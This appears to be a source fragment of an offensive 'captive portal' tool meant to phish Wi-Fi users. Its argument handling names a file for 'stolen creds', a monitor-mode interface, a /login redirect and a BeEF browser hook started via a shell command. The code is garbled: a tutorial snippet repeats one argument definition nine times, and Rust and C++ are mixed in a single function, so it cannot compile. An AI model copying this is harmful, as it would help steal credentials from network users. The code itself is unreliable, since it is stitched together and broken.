fn parse_commandline_arguments(){
    let matches = App::new("Captive Portal: Hackerman Edition")
    .version("0.1.0")
    .author("moop")
    .about("Captive portal for both security and personal use; FREE to USE unless you are a business! Then it's 'Fuck you, Pay me'")
    .arg(Arg::with_name("file")
             .short("f")
             .long("file")
             .takes_value(true)
             .help("A cool file"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .arg(Arg::with_name("num")
             .short("n")
             .long("number")
             .takes_value(true)
             .help("Five less than your favorite number"))
    .get_matches();
  
  let myfile = matches.value_of("file").unwrap_or("input.txt");
  println!("The file passed is: {}", myfile);
  
  let num_str = matches.value_of("num");
  match num_str {
    None => println!("No idea what your favorite number is."),
    Some(s) => {
        match s.parse::<i32>() {
            Ok(n) => println!("Your favorite number must be {}.", n + 5),
            Err(_) => println!("That's not a number! {}", s),
        }
    }
  }
      let args: Vec<String> = env::args().collect();
      let help          = &args[1];    // Shows the help
      let ADDRESS       = &args[2];    // IP address to use for server
      let PORT          = &args[3];    // port to use
      let INTERFACE     = &args[4];    // interface to use in monitor mode
      let CREDENTIALS   = &args[5];    // filename to save stolen creds to
      let DOCUMENT_ROOT = &args[6];    // doc root of server
      let EXTERNAL_HTML = &args[7];    //bool switch for serving external document instead of internal form
      let BEEF_HOOK     = &args[8];    // switch for beef hook
      let PORTAL        = &args[9];      // Trigger to actually implement the redirect
      let TBD           = &args[10];    // TO BE DECIDED
    try {
        options::notify(arguments);
    } catch (std::exception& e) {
        auto errortext = e.what();
        errprint(errortext);
        return 1;
    };
    if (arguments.count("help")) {
        cout << desc << "\n";
        return 1;
    };
    if (arguments.count("portal")) {
        PORTAL = true;
    };
    if (arguments.count("beef-hook")) {
        hook_location = arguments["address"].as<std::string>();
        hook_location = hook_location + ":3000";
        system("service beef start");
    } else {
        hook_location = "";
    };
    if (arguments.count("external-html")) {
        //auto pwd = filesystem::current_path();
        //document_root = pwd + arguments
    };
  
    document_root = arguments["document-root"].as<std::string>();
    credentials_file = arguments["credentials"].as<std::string>();
    PORT = arguments["port"].as<int>();
    redirect_ip =  arguments["address"].as<std::string>() + "/login";
    addr = arguments["address"].as<std::string>();
  };
  }